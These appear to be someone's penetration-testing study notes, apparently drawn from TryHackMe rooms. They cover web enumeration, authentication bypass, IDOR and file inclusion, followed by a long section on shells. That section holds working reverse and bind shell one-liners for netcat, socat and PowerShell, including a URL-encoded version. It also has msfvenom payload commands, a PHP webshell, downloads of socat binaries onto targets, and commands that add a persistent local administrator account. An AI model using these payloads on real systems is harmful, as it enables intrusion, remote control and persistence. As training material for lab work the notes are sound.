Walking an application:
  View source of website/app
  Inspect elements (blocked/hidden content) 
  Debugger for JS control/inspection
  Network to see requests made

  We've seen various different types of filter now: both client side and server side: as well as the general methodology for file upload attacks. In the next task you're going to be given a black-box file upload challenge to complete, so let's take the opportunity to discuss an example methodology for approaching this kind of challenge in a little more depth. You may develop your own alternative to this method, however, if you're new to this kind of attack, you may find the following information useful.

  We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.

  The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
  Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
  We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
  An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
  Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.

  Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:

  If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
  Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
  As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
  Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.

Content Discovery:
   Manual discovery (robots.txt, favicon for framework, sitemap.xml, curl http headers, framework vulnerabilities) 
   OSINT (dorking: Use google dork as
{site:*.target.com inurl:profile}, wappalyzer, wayback machine archive, github source code, automated discovery with ffuf, dirb and gobuster) 

Subdomain Enumeration:
   OSINT (SSL/TLS certs crt.sh and transparencyreport.google.com/https/certificates, search engines using filters/dorking, automated with Sublist3r)
   DNS Bruteforce (dnsrecon) 
   Virtual Hosts (host header manipulation with ffuf and namelists) 

Authentication Bypass:
    Username Enumeration (determine existing usernames with name wordlist and ffuf, -mr flag for expected response "username already exists" ) 
    Brute Force (use name wordlist and common password wordlist username_list.txt:W1,password_list.txt:W2 and -fc flag for expected response code 200) 
    Logic Flaw (use curl request to bypass input params with desired values eg. swap existing users password reset email with ours) 
    Cookie Tampering (crack hashes on crackstation.net or decode base32/base64 cookies and change values, cookies can then be sent in curl request) 

IDOR:
    Encoded IDs (IDs are found in post data, query strings or cookies. Common encoding is base64, use base64decode.org to decode then edit and encode the data )
   IDORs in hashed IDs (md5 is a common algorithm, use crackstation.net to match against known hashes)
   Unpredictable IDs (create 2 accounts and try swapping Id numbers between them. If you can then that's an IDOR vuln)
    Where are IDORs located (check network tab on page load for parameters, use parameter mining)
 
File Inclusion:
    Path traversal (use path traversal to move up the dir tree to access other areas of the server. 
/etc/issue: > contains a message or system identification to be printed before the login prompt.
/etc/profile: > controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
/proc/version: > specifies the version of the Linux kernel
/etc/passwd: > has all registered user that has access to a system
/etc/shadow: > contains information about the system's users' passwords
/root/.bash_history: > contains the history commands for root user
/var/log/dmessage: > contains global system messages, including the messages that are logged during system startup
/var/mail/root: > all emails for root user
/root/.ssh/id_rsa: > Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log: > the accessed requests for Apache  webserver
C:\boot.ini: > contains the boot options for computers with BIOS firmware) 
    Local File Inclusion LFI (exploit functions that use GET requests to access files to display content e.g. .php pages, lang pages. 
    Use error messages to determine the allowed or forbidden chars/dir paths, appended extensions like .php 
        *(for PHP 5.3.3 and below use Null byte %00 or 0x00 in hex) the /. current dir trick may work too, try double ….// next level up) 
   Remote File Inclusion RFI (host txt files with desired shell commands inside <?PHP echo exec('cmd-here') ; ?> to gain remote command execution RCE) 

SSRF Server-side request forgery:

XSS Cross-site scripting:

Command Injection:

SQL Injection:

Web Enumeration:

Gobuster:

tryhackme/room/owasptop10
tryhackme/room/easypeasyctf

WPScan:

tryhackme/room/rpwebscanning
tryhackme/room/blog

Nikto:

tryhackme/room/rpwebscanning
tryhackme/room/owasptop10
tryhackme/room/toolsrus
tryhackme/room/easyctf

Intro to shells:

Tools:
Netcat,
Socat, 
Metasploit multi/handler,
Msfvenom
github.com/swisskyrepo/PayloadsAllTheThings
web.archive.org pentestmonkey.net
github.com/danielmiessler/SecLists

Ok, so we've caught or connected to a netcat shell, what next?

These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. 
This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right. 
Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. 
Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.

Technique 1: Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

The first thing to do is use:

python -c 'import pty;pty.spawn("/bin/bash")'

which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. 
If this is the case, replace python with python2 or python3 as required. 
At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: 

export TERM=xterm

This will give us access to term commands such as clear.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use:

stty raw -echo; fg

This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). 
It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; 
however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with:

sudo apt install rlwrap.

To use rlwrap, we invoke a slightly different listener:

rlwrap nc -lvnp <port>

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. 
This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. 
When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use:

 stty raw -echo; fg

 to stabilise and re-enter the shell.

 Technique 3: Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. 
Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. 
To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. 
A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary 
(sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. 
On Linux this would be accomplished with curl or wget

 (wget <LOCAL-IP>/socat -O /tmp/socat).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed 

(Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\temp\socat.exe).

 We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

With any of the above techniques, it's useful to be able to change your terminal tty size.
This is something that your terminal will do automatically when using a regular shell; 
however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

Next, in your reverse/bind shell, type in:

stty rows <number>

and

stty cols <number>

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

Socat shells:

Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. 
In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. 
All socat does is provide a link between two points: much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

socat TCP-L:<port> -

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. 
The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.

On Windows we would use this command to connect back:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

Bind Shells

On a Linux target we would use the following command:

socat TCP-L:<PORT> EXEC:"bash -li"

On a Windows target we would use this command for our listener:

socat TCP-L:<PORT> EXEC:powershell.exe,pipes

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

socat TCP:<TARGET-IP>:<TARGET-PORT> -

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. 
This will only work when the target is Linux, but is significantly more stable. 
As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. 
Here is the new listener syntax:

socat TCP-L:<port> FILE:`tty`,raw,echo=0

Let's break this command down into its two parts. 
As usual, we're connecting two points together. In this case those points are a listening port, and a file. 
Specifically, we are passing in the current TTY as a file and setting the echo to be zero. 
This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell: with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. 
This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

This is a handful, so let's break it down.

The first part is easy: we're linking up with the listener running on our own machine. 
The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:

pty, allocates a pseudoterminal on the target: part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to "normalise" it.
That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. 
Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. 
This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. 
This is very useful for experimental purposes, but is not usually necessary for general use.

Shell payloads:

A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. 
In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) 
there is a -e option which allows you to execute a process on connection. For example, as a listener:

nc -lvnp <PORT> -e /bin/bash

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). 
On Windows where a static binary is nearly always required anyway, this technique will work perfectly. 
On Linux, however, we would instead use this code to create a listener for a bind shell:

mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

The following paragraph is the technical explanation for this command. 
It's slightly above the level of this room, so don't worry if it doesn't make much sense for now: the command itself is what matters.

The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. 
The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

A very similar command can be used to send a netcat reverse shell:

mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]: ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. 
It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell

Msfvenom:

Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. 
It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit;
 however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py). It's this latter function that we will be making use of in this room.
 There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.

The standard syntax for msfvenom is as follows:

msfvenom -p <PAYLOAD> <OPTIONS>

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

Here we are using a payload and four options:

-f <format>
Specifies the output format. In this case that is an executable (exe)
-o <file>
The output location and filename for the generated payload.
LHOST=<IP>
Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
LPORT=<port>
The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.

Staged payloads are sent in two parts. The first part is called the stager. 
This is a piece of code which is executed directly on the server itself. 
It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. 
Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. 
Thus the payload is split into two parts: a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. 
Staged payloads require a special listener: usually the Metasploit multi/handler, which will be covered in the next task.

Stageless payloads are more common: these are what we've been using up until now. 
They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. 
Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. 
Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

Meterpreter

On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. 
Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. 
They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. 
If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time.
The downside to meterpreter shells is that they must be caught in Metasploit. They are also banned from certain certification examinations, so it's a good idea to learn alternative methodologies.

Payload Naming Conventions

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

<OS>/<arch>/<payload>

For example:

linux/x86/shell_reverse_tcp

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

windows/shell_reverse_tcp

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.

In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. 
How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:

shell/reverse_tcp

As staged payloads are denoted with another forward slash (/).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

windows/x64/meterpreter/reverse_tcp

A Linux 32bit stageless Meterpreter payload would look like this:

linux/x86/meterpreter_reverse_tcp

Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

msfvenom --list payloads

This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads. 

 

Multi/Handler:

Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, it's relatively easy to use:

Open Metasploit with msfconsole
Type use multi/handler, and press enter
We are now primed to start a multi/handler session. Let's take a look at the available options using the options command:

There are three options we need to set: payload, LHOST and LPORT. 
These are all identical to the options we set when generating shellcode with Msfvenom;
  a payload specific to our target, as well as a listening address and port with which we can receive a shell. 
Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will;
  it must be told a specific address to listen with (when using TryHackMe, this will be your tun0 address). 
  We set these options with the following commands:

set PAYLOAD <payload>
set LHOST <listen-address>
set LPORT <listen-port>
We should now be ready to start the listener!

Let's do this by using the exploit -j command. This tells Metasploit to launch the module, running as a job in the background.

You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit must be run with sudo permissions.

When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:

Notice that, because the multi/handler was originally backgrounded, we needed to use sessions 1 to foreground it again. This worked as it was the only session running.
Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground.
This number would also have been displayed in the line where the shell was opened (see "Command Shell session 1 opened").

 

WebShells:
 

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. 
Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. 
In these cases we would instead upload a webshell. See the Upload Vulnerabilities Room for a more extensive look at this concept.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. 
Essentially, commands are entered into a webpage: either through a HTML form, or directly as arguments in the URL: which are then executed by the script, with the results returned and written to the page. 
This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

This will take a GET parameter in the URL and execute it on the system with shell_exec(). 
Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system: be it Windows or Linux. 
The "pre" elements are to ensure that the results are formatted correctly on the page.

Let's see this in action:

Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. 
In other words, by entering the ifconfig command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. 
This would work for any other command we chose to use (e.g. whoami, hostname, arch, etc).

As mentioned previously, there are a variety of webshells available on Kali by default at /usr/share/webshells: including the infamous PentestMonkey php-reverse-shell: a full reverse shell written in PHP. 
Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. 
With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:

powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. 
Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

Upload vulns:

Target Scan Methodology 

We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.

The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.
Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:

If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.

Useful Stuff:

Add admin user cmd:
net user mylocaladmin p@ssw0rd! /add /expires:never
net localgroup administrators mylocaladmin /add
 

 
